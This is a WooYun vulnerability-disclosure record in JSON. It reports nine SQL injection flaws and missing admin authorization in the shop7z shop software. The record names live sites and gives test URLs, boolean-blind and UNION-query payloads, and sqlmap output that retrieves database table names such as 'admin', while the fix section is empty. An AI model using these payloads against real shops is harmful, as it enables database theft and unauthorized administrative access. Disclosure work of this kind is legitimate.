{"id": 32469, "wybug_id": "wooyun-2015-0109753", "wybug_title": "shop7z九处SQL注入打包", "wybug_corp": "shop7z", "wybug_author": "gobal", "wybug_date": "2015-04-23 15:21", "wybug_open_date": "2015-06-07 15:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： shop7z九处SQL注入打包 提交好几次了 虽然很累 不过想到审核的哥们要审核那么多洞 自己的累确实不算什么  详细说明：  案例：http://www.gzsewing.comhttp://www.125309.comhttp://www.nm3g.orghttp://35dianqi.comhttp://www.ai04.comhttp://www.longmm.nethttp://www.99pwan.comhttp://www.heimawg.comhttp://www.hzjdpm.cnhttp://ptwb.nethttp://5lmm.cn#1漏洞文件：/admin/dingdan_sendnot.asp 问题参数：id【POST下】 TEST：http://www.125309.com/admin/dingdan_sendnot.asp\nid=1\n\nPlace: POSTParameter: id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: id=IIF(2159=2159,1,1/0)---[19:37:57] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:37:57] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[19:37:57] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'[19:37:57] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[19:37:57] [INFO] retrieved:[19:37:58] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[19:37:58] [WARNING] unable to retrieve the number of tables for database 'Microsoft_Access_masterdb'[19:37:58] [ERROR] cannot retrieve table names, back-end DBMS is Accessdo you want to use common table existence check? [Y/n/q] y[19:38:01] [INFO] checking table existence using items from 'D:\\python\\sqlmap\\txt\\common-tables.txt'[19:38:01] [INFO] adding words used on web page to the check listplease enter number of threads? [Enter for 1 (current)] 9[19:38:01] [INFO] starting 9 threads[19:38:06] [INFO] retrieved: admin[19:38:23] [INFO] retrieved: article[19:40:37] [INFO] retrieved: ad[19:41:05] [INFO] retrieved: messageDatabase: Microsoft_Access_masterdb[4 tables]+---------+| ad      || admin   || article || message |+---------+\n#2漏洞文件：/admin/lipindel.asp【存在越权】 问题参数：idTEST：http://www.125309.com/admin/lipindel.asp?id=1\nPlace: GETParameter: id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: id=IIF(1449=1449,1,1/0)---[19:46:56] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:46:56] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:46:56\n#3漏洞文件：/show.asp?tk=shop7z 问题参数：pkid【POST下】TEST:http://www.125309.com/show.asp?tk=shop7z\npkid=1\n\nPlace: POSTParameter: pkid    Type: UNION query    Title: Generic UNION query (NULL) - 38 columns    Payload: pkid=-2466 UNION ALL SELECT CHR(58)&CHR(120)&CHR(108)&CHR(112)&CHR(58)&CHR(111)&CHR(71)&CHR(69)&CHR(101)&CHR(89)&CHR(81)&CHR(101)&CHR(74)&CHR(104)&CHR(110)&CHR(58)&CHR(99)&CHR(106)&CHR(99)&CHR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROMMSysAccessObjects%00---[19:48:36] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:48:36] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:48:36\n#4漏洞文件：orderpro_del.asp 问题参数：idTEST:http://www.125309.com/orderpro_del.asp?id=1\nPlace: GETParameter: id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: id=IIF(2623=2623,1,1/0)---[19:50:23] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft Access[19:50:23] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:50:23\n#5漏洞文件：show_foot.asp 问题参数：c_id TEST：http://www.125309.com/show_foot.asp?c_id=1\nPlace: GETParameter: c_id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: c_id=IIF(3932=3932,1,1/0)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: c_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(58)&CHR(104)&CHR(115)&CHR(121)&CHR(58)&CHR(115)&CHR(90)&CHR(101)&CHR(90)&CHR(89)&CHR(79)&CHR(67)&CHR(102)&CHR(120)&CHR(119)&CHR(58)&CHR(102)&CHR(113)&CHR(107)&CHR(58),NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%00---[19:51:54] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:51:55] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:51:55\n#6漏洞文件：showone.asp 问题参数：l_idTEST:http://www.125309.com/showone.asp?l_id=1\nPlace: GETParameter: l_id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: l_id=IIF(9827=9827,1,1/0)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: l_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(58)&CHR(122)&CHR(102)&CHR(104)&CHR(58)&CHR(113)&CHR(87)&CHR(69)&CHR(120)&CHR(108)&CHR(79)&CHR(88)&CHR(86)&CHR(109)&CHR(116)&CHR(58)&CHR(106)&CHR(116)&CHR(122)&CHR(58),NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%00---[19:53:38] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:53:38] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:53:38\n#7漏洞文件：/admin/dingdan_detail.asp【存在越权】 问题参数：idTEST:http://www.125309.com/admin/dingdan_detail.asp?id=1\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 9606=9606---[19:54:50] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:54:50] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:54:50\n   漏洞证明：  #8漏洞文件：/admin/chongzhimodify.asp【存在越权】 问题参数：id【POST下】TEST:http://www.125309.com/admin/chongzhimodify.asp\nid=1\n\nPlace: POSTParameter: id    Type: boolean-based blind    Title: Microsoft Access boolean-based blind - Parameter replace (original value)    Payload: id=IIF(3785=3785,1,1/0)---[19:58:56] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[19:58:56] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 85 times[19:58:56] [INFO] fetched data logged to text files under 'D:\\python\\sqlmap\\output\\www.125309.com'[*] shutting down at 19:58:56\n还有处不确定 不过应该是注入#9漏洞文件：/admin/zhfbili.asp【存在越权】 问题参数：zhfbili【POST下】 TEST:http://www.125309.com/admin/zhfbili.asp\nzhfbili=1'&Submit=+%B1%A3%B4%E6+&ok=1\n\nMicrosoft OLE DB Provider for ODBC Drivers 错误 '80040e14'[Microsoft][ODBC Microsoft Access Driver] 字符串的语法错误 在查询表达式 ''1''' 中。/admin/zhfbili.asp，行 77\n   修复方案：  RT   版权声明：转载请注明来源 gobal@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2015-04-24 07:26 |    \t\t微笑Style \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 代码爱好者)\t\t \n  网趣的我也提交了，我的为啥迟迟不审核    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}